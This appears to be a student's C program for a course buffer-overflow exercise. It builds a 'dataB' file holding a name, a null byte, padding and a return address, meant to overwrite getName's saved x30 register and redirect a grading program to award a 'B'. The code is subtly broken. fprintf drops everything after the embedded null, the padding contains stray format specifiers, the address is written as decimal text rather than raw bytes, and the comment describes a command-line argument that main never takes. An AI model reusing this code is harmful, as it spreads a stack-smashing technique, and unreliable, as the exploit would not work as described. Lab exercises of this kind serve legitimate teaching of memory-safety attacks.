/*--------------------------------------------------------------------*/
/* File: createdataB.c                                                */
/*                                                                    */
/* Function: Produces a file called dataB with the student name,      */
/* a nullbyte, padding to overrun the stack, and the address          */
/* of the instruction in main to get a B, the latter of which will    */
/* overwrite getName's stored x30.                                    */
/*                                                                    */
/* Names: Alex Delistathis, Matthew Zhang                             */
/*--------------------------------------------------------------------*/

#include <stdio.h>

/* Accepts a string of characters as a command-line argument. Writes
   the string of characters to the dataB file. Returns 0. */
int main(void) {
   
   FILE *dataB;
   
   dataB = fopen("dataB", "w+");
   fprintf(dataB, "Alex Delistathis & Matthew Zhang\0"
      );
   fprintf(dataB, "%!$#^@*&@^#&*&&4196500");

   return 0;
}
   
